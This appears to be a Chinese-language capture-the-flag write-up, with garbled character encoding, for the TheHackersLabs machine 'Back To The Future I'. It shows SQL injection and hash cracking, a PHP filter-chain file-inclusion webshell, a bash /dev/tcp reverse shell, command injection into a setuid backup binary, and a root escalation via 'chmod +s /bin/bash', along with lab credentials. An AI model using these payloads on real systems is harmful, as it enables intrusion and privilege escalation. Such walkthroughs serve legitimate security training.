{"pageProps":{"postData":{"id":"TheHackersLabsBack To The Future I","contentHtml":"<h1>Back To The Future I</h1>\n<blockquote>\n<p><a href=\"https://labs.thehackerslabs.com/machine/119\">https://labs.thehackerslabs.com/machine/119</a></p>\n</blockquote>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-bash\">âœ  Back_To_The_Future_I nmap -sT -min-rate 10000 -p- 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:01 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.94\nHost is up (0.00056s latency).\nNot shown: 65531 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n21/tcp   open  ftp\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 3.52 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">âœ  Back_To_The_Future_I nmap -sT -A -p 21,22,80,3306 192.168.56.94\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 14:05 CST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.94\nHost is up (0.00051s latency).\n\nPORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 3.0.3\n22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)\n| ssh-hostkey: \n|   256 f7:c5:4a:ca:73:0e:21:ed:9f:5d:7e:35:65:f6:9f:b2 (ECDSA)\n|_  256 <span class=\"hljs-built_in\">fc</span>:f2:e9:1a:ae:3c:da:94:f5:db:11:b2:8b:5c:7f:32 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62\n|_http-title: Did not follow redirect to http://hillvalley.thl/\n|_http-server-header: Apache/2.4.62 (Debian)\n3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)\nMAC Address: 08:00:27:82:2C:CD (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: Host: _default_; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.51 ms 192.168.56.94\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 9.68 seconds\n</code></pre>\n<h3>æšä¸¾</h3>\n<p><code>FTP</code> åŒ¿å</p>\n<pre><code class=\"hljs language-bash\">âœ  Back_To_The_Future_I ftp 192.168.56.94\nConnected to 192.168.56.94.\n220 (vsFTPd 3.0.3)\nName (192.168.56.94:root): anonymous\n530 Permission denied.\nftp: Login failed\n</code></pre>\n<p><code>HTTP</code> æœåŠ¡</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image1.png\" alt=\"image.png\"></p>\n<p>æŸ¥çœ‹æºç èƒ½æ‰¾åˆ°</p>\n<pre><code class=\"hljs language-bash\">  &#x3C;!-- Â¡El reloj de la torre no tiene nada que ver! Â¿O sÃ­? -->\n  &#x3C;!-- å¡”é’Ÿè·Ÿè¿™äº‹å„¿ä¸€ç‚¹å…³ç³»éƒ½æ²¡æœ‰ï¼æˆ–è€…è¯´ï¼Œæœ‰å…³ç³»ï¼Ÿ-->\n</code></pre>\n<p>ç›®å½•çˆ†ç ´</p>\n<pre><code class=\"hljs language-bash\">âœ  Back_To_The_Future_I feroxbuster --url http://hillvalley.thl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x a\nsp,php,txt,zip                                                                                  \n                                                                                                \n ___  ___  __   __     __      __         __   ___                           \n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__                                                                                                                                               \n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___                                                                                                                                              \nby Ben <span class=\"hljs-string\">\"epi\"</span> Risher ğŸ¤“                 ver: 2.11.0                                                                                                                                              \nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€                                                                                                                                              \n ğŸ¯  Target Url            â”‚ http://hillvalley.thl/\n ğŸš€  Threads               â”‚ 50\n ğŸ“–  Wordlist              â”‚ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n ğŸ’¢  Status Code Filters   â”‚ [404, 503, 400]\n ğŸ’¥  Timeout (secs)        â”‚ 7\n ğŸ¦¡  User-Agent            â”‚ feroxbuster/2.11.0\n ğŸ’‰  Config File           â”‚ /etc/feroxbuster/ferox-config.toml\n ğŸ”  Extract Links         â”‚ <span class=\"hljs-literal\">true</span>\n ğŸ’²  Extensions            â”‚ [asp, php, txt, zip]\n ğŸ  HTTP methods          â”‚ [GET]\n ğŸ”ƒ  Recursion Depth       â”‚ 4\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n ğŸ  Press [ENTER] to use the Scan Management Menuâ„¢\nâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n200      GET      175l      325w     3150c http://hillvalley.thl/css/styles.css\n200      GET       69l      176w     2948c http://hillvalley.thl/index.php\n200      GET       69l      176w     2948c http://hillvalley.thl/\n200      GET        3l       28w      240c http://hillvalley.thl/about.php\n302      GET        0l        0w        0c http://hillvalley.thl/admin.php => index.php\n301      GET        9l       28w      314c http://hillvalley.thl/css => http://hillvalley.thl/css/\n301      GET        9l       28w      314c http://hillvalley.thl/img => http://hillvalley.thl/img/\n200      GET      140l      809w    61123c http://hillvalley.thl/img/flux_capacitor.png\n301      GET        9l       28w      313c http://hillvalley.thl/js => http://hillvalley.thl/js/\n200      GET       23l       61w      838c http://hillvalley.thl/js/index.js\n302      GET        0l        0w        0c http://hillvalley.thl/logout.php => index.php\n200      GET        0l        0w        0c http://hillvalley.thl/config.php\n200      GET        6l       25w      216c http://hillvalley.thl/logs.php\n200      GET     9932l    58762w  4734247c http://hillvalley.thl/img/delorean.png\n200      GET       28l      143w     1121c http://hillvalley.thl/time_machine.php\n[####################] - 79s  1038210/1038210 0s      found:15      errors:0      \n[####################] - 78s  1038145/1038145 13250/s http://hillvalley.thl/ \n[####################] - 0s   1038145/1038145 94376818/s http://hillvalley.thl/css/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 7s   1038145/1038145 146548/s http://hillvalley.thl/img/ => Directory listing (add --scan-dir-listings to scan)\n[####################] - 0s   1038145/1038145 37076607/s http://hillvalley.thl/js/ => Directory listing (add --scan-dir-listings to scan)\n</code></pre>\n<p><code>about.php</code></p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image2.png\" alt=\"image.png\"></p>\n<p><code>logs.php</code></p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image3.png\" alt=\"image.png\"></p>\n<p><code>time_machine.php</code></p>\n<p>ï¼ŸEI Psy Kongroo ~</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image4.png\" alt=\"image.png\"></p>\n<p>æ²¡æ‰¾åˆ°ä¿¡æ¯ï¼Œå°è¯•çˆ†ç ´ç™»å½•æ¡†ï¼Œä¹Ÿæ˜¯ä¸æˆåŠŸ</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image5.png\" alt=\"image.png\"></p>\n<p>æµ‹è¯•ä¸€ä¸‹ç™»å½•æ¡†</p>\n<p>å‘ç°å­˜åœ¨ <code>SQL</code> æ³¨å…¥</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image6.png\" alt=\"image.png\"></p>\n<h2>SQL æ³¨å…¥</h2>\n<p>ç›´æ¥ä¸Š <code>SQLmap</code> ï¼Œæµ‹è¯•å‡ºæ¥ å»¶æ—¶æ³¨å…¥</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image7.png\" alt=\"image.png\"></p>\n<p>å°†æ•°æ®éƒ½çˆ†å‡ºæ¥</p>\n<pre><code class=\"hljs language-bash\">current user: <span class=\"hljs-string\">'marty@localhost'</span>\ncurrent database: <span class=\"hljs-string\">'hillvalley'</span>\n\nDatabase: hillvalley\n[1 table]\n+-------+\n| <span class=\"hljs-built_in\">users</span> |\n+-------+\n\n+----+--------------------------------------------------------------+----------+\n| <span class=\"hljs-built_in\">id</span> | password                                                     | username |\n+----+--------------------------------------------------------------+----------+\n| 1  | $2y$10$.YPplAJvApyzvxjuWXdeHO1lIkolJIq9GzGERgmHqHLi.1/.zGJhy | marty    |\n+----+--------------------------------------------------------------+----------+\n</code></pre>\n<p>å°†å¯†ç è¿›è¡Œçˆ†ç ´</p>\n<pre><code class=\"hljs language-bash\">âœ  Back_To_The_Future_I john --wordlist=/usr/share/wordlists/rockyou.txt <span class=\"hljs-built_in\">hash</span>                 \nUsing default input encoding: UTF-8\nLoaded 1 password <span class=\"hljs-built_in\">hash</span> (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\nandromeda        (?)     \nUse the <span class=\"hljs-string\">\"--show\"</span> option to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>å¾—åˆ°ä¸€ä¸ªè´¦æˆ· <code>marty</code>:<code>andromeda</code></p>\n<h2>æ–‡ä»¶åŒ…å«</h2>\n<p>ç™»å½•è¿›å»åå°</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image8.png\" alt=\"image.png\"></p>\n<p>å¾—åˆ°ä¸€äº›å…³äºå¯†ç ä¿¡æ¯</p>\n<pre><code class=\"hljs language-bash\">æˆ‘å®æ–½äº†ä¸€é¡¹åŸºæœ¬çš„å®‰å…¨æªæ–½æ¥ä¿æŠ¤å…³é”®çš„é¡¹ç›®æ–‡ä»¶ã€‚\næˆ‘ä½¿ç”¨äº†ä¸æˆ‘çš„æ—¶å…‰æœºå’Œç¬¬ä¸€æ¬¡è·³è·ƒçš„æ—¥æœŸç›¸å…³çš„å¯†ç ã€‚\n\né©¬è’‚æ°¸è¿œä¸ä¼šå¿˜è®°é‚£ä¸€å¤©ã€‚\n\nâ€”â€”åŒ»ç”Ÿ\n</code></pre>\n<p>æˆ‘ä»¬è¿˜æ³¨æ„åˆ°<code>URL</code>æ˜¯è²Œä¼¼æ˜¯åŒ…å«æ–‡ä»¶çš„ï¼Œæˆ‘ä»¬å°è¯•ä¸€ä¸‹åŒ…å«ä¸€ä¸‹åˆ«çš„æ–‡ä»¶</p>\n<p>æˆåŠŸå°† <code>/etc/passwd</code> åŒ…å«å‡ºæ¥</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image9.png\" alt=\"image.png\"></p>\n<p>å¯ä»¥ç›´æ¥å°† <code>user.txt</code> ç»™åŒ…å«å‡ºæ¥</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image10.png\" alt=\"image.png\"></p>\n<p>ä½†æˆ‘ä»¬çš„ç›®çš„æ˜¯æ‹¿åˆ° <code>shell</code></p>\n<p>æµ‹è¯•ä¼ªåè®®æ˜¯å¦å¯ä»¥ä½¿ç”¨</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image11.png\" alt=\"image.png\"></p>\n<p>æˆ‘ä»¬å°è¯•é€šè¿‡ <code>php://filter/write</code> æ¥å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸ</p>\n<pre><code class=\"hljs language-bash\">php://filter/write=convert.base64-decode/resource=shell.php&#x26;data=PD9waHAgZXZhbChzeXN0ZW0oJF9QT1NUWyJ4Il0pKTtwaHBpbmZvKCk7Pz4=\n</code></pre>\n<p>é€šè¿‡ï¼š<a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md\">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md</a></p>\n<p>èƒ½åˆ°ä¸€ä¸ªå·¥å…· <strong>PHP filter chain generator</strong>ï¼š<a href=\"https://github.com/synacktiv/php_filter_chain_generator\">https://github.com/synacktiv/php_filter_chain_generator</a></p>\n<p>ç”Ÿæˆ <code>payload</code>ï¼š</p>\n<pre><code class=\"hljs language-bash\">python3 php_filter_chain_generator.py --chain <span class=\"hljs-string\">'&#x3C;?php phpinfo(); ?>  '</span>\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image12.png\" alt=\"image.png\"></p>\n<p>ç”Ÿæˆåå¼¹ <code>shell</code> çš„ä»£ç ï¼š</p>\n<pre><code class=\"hljs language-bash\">\tpython3 php_filter_chain_generator.py --chain <span class=\"hljs-string\">'&#x3C;?php eval(system($_GET[\"x\"])); ?>  '</span>\n</code></pre>\n<p>æµ‹è¯•ä»£ç æ‰§è¡Œ</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image13.png\" alt=\"image.png\"></p>\n<p>è¿›è¡Œåå¼¹ <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">/bin/bash -c <span class=\"hljs-string\">'bash -i >&#x26; /dev/tcp/192.168.56.5/1234 0>&#x26;1'</span>\n</code></pre>\n<p>æ‹¿åˆ°ç«‹è¶³ç‚¹</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image14.png\" alt=\"image.png\"></p>\n<h2>To Marty</h2>\n<p>æŸ¥çœ‹é…ç½®æ–‡ä»¶</p>\n<pre><code class=\"hljs language-bash\">www-data@hillvalley:/var/www/project/app$ <span class=\"hljs-built_in\">cat</span> config.php \n&#x3C;?php\n<span class=\"hljs-variable\">$host</span> = <span class=\"hljs-string\">\"localhost\"</span>;\n<span class=\"hljs-variable\">$user</span> = <span class=\"hljs-string\">\"marty\"</span>;\n<span class=\"hljs-variable\">$pass</span> = <span class=\"hljs-string\">\"t1m3travel\"</span>;\n<span class=\"hljs-variable\">$db</span> = <span class=\"hljs-string\">\"hillvalley\"</span>;\n\n<span class=\"hljs-variable\">$conn</span> = mysqli_connect(<span class=\"hljs-variable\">$host</span>, <span class=\"hljs-variable\">$user</span>, <span class=\"hljs-variable\">$pass</span>, <span class=\"hljs-variable\">$db</span>);\n<span class=\"hljs-keyword\">if</span> (!<span class=\"hljs-variable\">$conn</span>) {\n    die(<span class=\"hljs-string\">\"Connection failed: \"</span> . mysqli_connect_error());\n}\n?>\n</code></pre>\n<p>æ‹¿åˆ°æ•°æ®åº“è´¦å·å¯†ç ï¼Œå› ä¸ºç”¨æˆ·åæ˜¯ <code>marty</code> ï¼Œæˆ‘ä»¬é¡ºä¾¿ç¢°æ’ä¸€ä¸‹å¯†ç </p>\n<pre><code class=\"hljs language-bash\">www-data@hillvalley:/var/www/project/app$ su marty\nPassword: \nmarty@hillvalley:/var/www/project/app$ \n</code></pre>\n<p>æˆåŠŸåˆ‡æ¢åˆ°ç”¨æˆ·<code>Marty</code></p>\n<p>æˆ‘ä»¬å†™å…¥ <code>SSH</code> å…¬é’¥ï¼Œä½¿ç”¨å…¬é’¥è¿›è¡Œç™»å½•</p>\n<h2>To docbrown</h2>\n<p>å®¶ç›®å½•ä¸‹çš„éšè—æ–‡ä»¶</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:~$ <span class=\"hljs-built_in\">cat</span> .flux_notes \nTiempos inestables... aÃºn necesito arreglar el runner para la <span class=\"hljs-built_in\">pr</span>Ã³xima prueba.\n</code></pre>\n<blockquote>\n<p>æ—¶é—´ä¸ç¨³å®š...ä»ç„¶éœ€è¦ä¿®å¤è¿è¡Œå™¨ä»¥è¿›è¡Œä¸‹ä¸€æ¬¡æµ‹è¯•ã€‚</p>\n</blockquote>\n<p>èƒ½ç›´æ¥çœ‹<code>docbrown</code>çš„å®¶ç›®å½•</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 88\ndrwxr-xr-x 15 docbrown docbrown 4096 Jul 15 10:45 .\ndrwxr-xr-x  4 root     root     4096 Jul 12 15:49 ..\nlrwxrwxrwx  1 root     root        9 Jul 13 16:50 .bash_history -> /dev/null\n-rw-r--r--  1 docbrown docbrown  220 Jul 11 22:04 .bash_logout\n-rw-r--r--  1 docbrown docbrown 3662 Jul 12 20:23 .bashrc\ndrwx------ 10 docbrown docbrown 4096 Jul 11 22:27 .cache\ndrwx------  9 docbrown docbrown 4096 Jul 12 20:41 .config\n-rw-r--r--  1 docbrown docbrown 5290 Jul 11 22:04 .face\nlrwxrwxrwx  1 docbrown docbrown    5 Jul 11 22:04 .face.icon -> .face\n-rw-r--r--  1 docbrown docbrown  110 Jul 13 14:10 .flux_hint\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:08 .<span class=\"hljs-built_in\">local</span>\ndrwx------  4 docbrown docbrown 4096 Jul 11 22:27 .mozilla\n-rw-r--r--  1 docbrown docbrown  807 Jul 11 22:04 .profile\n-rw-------  1 docbrown docbrown  817 Jul 13 12:52 .viminfo\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Desktop\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Documents\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Downloads\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Music\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Pictures\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Public\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Templates\ndrwxr-xr-x  2 docbrown docbrown 4096 Jul 11 22:08 Videos\ndrwxrwxrwx  2 docbrown docbrown 4096 Jul 12 20:49 docs\n</code></pre>\n<p><code>.flux_hint</code></p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">cat</span> .flux_hint \nHe estado trabajando en una nueva forma de sincronizar los scripts del sistema. Cada minuto... como un reloj.\n</code></pre>\n<blockquote>\n<p>æˆ‘ä¸€ç›´åœ¨ç ”ç©¶ä¸€ç§åŒæ­¥ç³»ç»Ÿè„šæœ¬çš„æ–°æ–¹æ³•ã€‚åˆ†åˆ†ç§’ç§’â€¦â€¦ç²¾å‡†æ— è¯¯ã€‚</p>\n</blockquote>\n<p>æåˆ°äº†åŒæ­¥ç³»ç»Ÿè„šæœ¬ï¼Œæˆ‘ä»¬ä¸Š<code>pspy</code>çœ‹çœ‹</p>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image15.png\" alt=\"image.png\"></p>\n<p>æ³¨æ„åˆ° <strong><code>/usr/local/bin/flux_admin.sh</code></strong></p>\n<p>ä½†æ˜¯æ ¹ç›®å½•ä¸­ä¹Ÿæ˜¯æ²¡æœ‰</p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">ls</span> -al\ntotal 40\ndrwxr-xr-x  2 root root  4096 Jul 14 21:53 .\ndrwxr-xr-x 10 root root  4096 Jul 11 21:56 ..\n-rwxr-xr-x  1 root root 16200 Jul 12 20:49 backup_runner\n-rwx------  1 root root 16296 Jul 14 20:44 time_daemon\n</code></pre>\n<p>ä¸Š <code>linpeas.sh</code> çœ‹çœ‹</p>\n<p>å¯ä»¥æ³¨æ„åˆ°å¦‚ä¸‹ä¿¡æ¯</p>\n<pre><code class=\"hljs language-bash\">Files with capabilities (limited to 50): \n/usr/local/bin/backup_runner cap_setuid=ep \n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep\n/usr/bin/ping cap_net_raw=ep \n</code></pre>\n<p>å½“ç¨‹åº <code>backup_runner</code> è¿è¡Œæ—¶ä¸€äº›æ‹¥æœ‰ <code>setuid</code> æƒé™ï¼Œå¯ä»¥ä»¥å…¶ä»–ç”¨æˆ·æƒé™è¿è¡Œ</p>\n<p>æˆ‘ä»¬å°†å…¶æ‹‰å‡ºå»åˆ†æä¸€ä¸‹</p>\n<pre><code class=\"hljs language-bash\">int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  char s[264]; // [rsp+10h] [rbp-110h] BYREF\n  const char *v5; // [rsp+118h] [rbp-8h]\n\n  <span class=\"hljs-keyword\">if</span> ( argc != 2 )\n    usage(argc, argv, envp);\n  v5 = argv[1];\n  snprintf(s, 0x100uLL, <span class=\"hljs-string\">\"tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs\"</span>, v5);\n  setuid(0x3E8u);\n  system(s);\n  <span class=\"hljs-built_in\">return</span> 0;\n}\n</code></pre>\n<p>å…¶ä¸­çš„ <code>setuid(0x3E8u);</code> ä¹Ÿå°±æ˜¯ <code>1000</code> ï¼Œè€Œ <code>1000</code> åˆšå¥½æ˜¯ <code>docbrown</code></p>\n<p>å¹¶ä¸”æ‰§è¡Œçš„å‘½ä»¤æ˜¯ <code>tar czf /tmp/%s-backup.tar.gz /home/docbrown/docs</code></p>\n<p>è¯¥ç¨‹åºå­˜åœ¨å‘½ä»¤æ³¨å…¥ï¼Œå› ä¸º <code>v5</code> å¹¶æ²¡æœ‰è¢«å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥è¢«è°ƒç”¨</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-string\">\"; id ;\"</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner <span class=\"hljs-string\">\"; id ;\"</span>\ntar: Cowardly refusing to create an empty archive\nTry <span class=\"hljs-string\">'tar --help'</span> or <span class=\"hljs-string\">'tar --usage'</span> <span class=\"hljs-keyword\">for</span> more information.\nuid=1000(docbrown) gid=1001(marty) <span class=\"hljs-built_in\">groups</span>=1001(marty)\nsh: 1: -backup.tar.gz: not found\n</code></pre>\n<p>è·å¾— <code>docbrown</code> çš„ <code>shell</code></p>\n<pre><code class=\"hljs language-bash\">marty@hillvalley:/home/docbrown$ /usr/local/bin/backup_runner <span class=\"hljs-string\">\"; /bin/bash -p ;\"</span>\ntar: Cowardly refusing to create an empty archive\nTry <span class=\"hljs-string\">'tar --help'</span> or <span class=\"hljs-string\">'tar --usage'</span> <span class=\"hljs-keyword\">for</span> more information.\ndocbrown@hillvalley:/home/docbrown$ \n</code></pre>\n<h2>To Root</h2>\n<p>æŸ¥çœ‹ <code>sudo</code> æƒé™</p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/home/docbrown$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> docbrown on hillvaley:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser docbrown may run the following commands on hillvaley:\n    (root) NOPASSWD: /usr/local/bin/time_daemon\n</code></pre>\n<p>æˆ‘ä»¬å°è¯•è¿è¡Œä¸€ä¸‹</p>\n<pre><code class=\"hljs language-bash\">[FLUX] No existe el archivo /tmp/sync: No such file or directory\n</code></pre>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/tmp$ vim <span class=\"hljs-built_in\">sync</span>\ndocbrown@hillvalley:/tmp$ <span class=\"hljs-built_in\">sudo</span> time_daemon\n[88MPH] SincronizaciÃ³n completada. Listo para viajar.\n</code></pre>\n<p><img src=\"/post-images/TheHackersLabsBack%20To%20The%20Future%20I/image16.png\" alt=\"image.png\"></p>\n<p>è²Œä¼¼æ˜¯åˆ›å»ºå®šæ—¶ä»»åŠ¡</p>\n<p>æˆ‘ä»¬å°†ææƒè¯­å¥å†™å…¥ <code>/tmp/sync</code> å¹¶è¿è¡Œ <code>time_deamon</code></p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/tmp$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"chmod +s /bin/bash\"</span> > /tmp/sync\n\ndocbrown@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">sudo</span> /usr/local/bin/time_daemon\n[88MPH] SincronizaciÃ³n completada. Listo para viajar.\n</code></pre>\n<p>ç­‰åœ¨ <code>pspy</code> æ˜¾ç¤ºè¿è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œå†æŸ¥çœ‹</p>\n<pre><code class=\"hljs language-bash\">docbrown@hillvalley:/usr/local/bin$ <span class=\"hljs-built_in\">ls</span> -al /bin/bash\n-rwsr-sr-x 1 root root 1265648 Apr 18 19:47 /bin/bash\n</code></pre>\n<p>æœ€åè¯»å– <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">bash-5.2# <span class=\"hljs-built_in\">cat</span> notes.txt \nÂ¡Felicidades, viajero del tiempo!\n\nLograste lo imposible: viajaste al pasado, burlaste sistemas protegidos, superaste obstÃ¡culos temporales y... \nÂ¡volviste al futuro con todos los flags en el DeLorean!\n\nDoc estarÃ­a orgulloso, y Martyâ€¦ bueno, seguro todavÃ­a estÃ¡ en problemas con Biff. \nPero vosâ€¦ vos demostraste que no hay sistema que se te resista ni timeline que no puedas manipular.\n\n    â€œEl futuro no estÃ¡ escrito, todavÃ­a. El tuyo serÃ¡ exactamente como lo hagas.â€\n    â€” Doc Emmett Brown\n\nGracias por jugar este CTF inspirado en una de las mejores trilogÃ­as de todos los tiempos. \n\nSi disfrutaste el viaje, no olvides compartir tus hallazgos con otros hackers del tiempo y prepararte para los <span class=\"hljs-built_in\">pr</span>Ã³ximos desafÃ­os que se vienen en la saga.\n\nbash-5.2# <span class=\"hljs-built_in\">cat</span> root.txt \nFLAGxxxxxxxxxxxxxxxxxxxxxx\n</code></pre>\n<h2>æ€»ç»“</h2>\n<p>éš¾åº¦è¿˜å¥½ï¼Œå°±æ˜¯æœ‰äº›åœ°æ–¹ä¼šå¡ä½</p>","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","updated":"2025-07-26","tags":["TheHackersLabs","Linux","SQLinjection","FileInclude","CommandInjection"],"categories":"é¶æœº","comments":true,"description":"Back To The Future I\n\n https://labs.thehackerslabs.com/machine/119\n \n\n\n\nRecon\n\nPortScan\n\n\n\n\n\næšä¸¾\n\n`FTP` åŒ¿å\n\n\n\n`HTTP` æœåŠ¡\n\n\n\næŸ¥çœ‹æºç èƒ½æ‰¾åˆ°\n\n\n\nç›®å½•çˆ†ç ´\n\n\n\n`about.php`\n\n\n\n`logs.php`\n\n\n\n`time_machine.php`\n\n ï¼ŸEI Psy K..."}},"__N_SSG":true}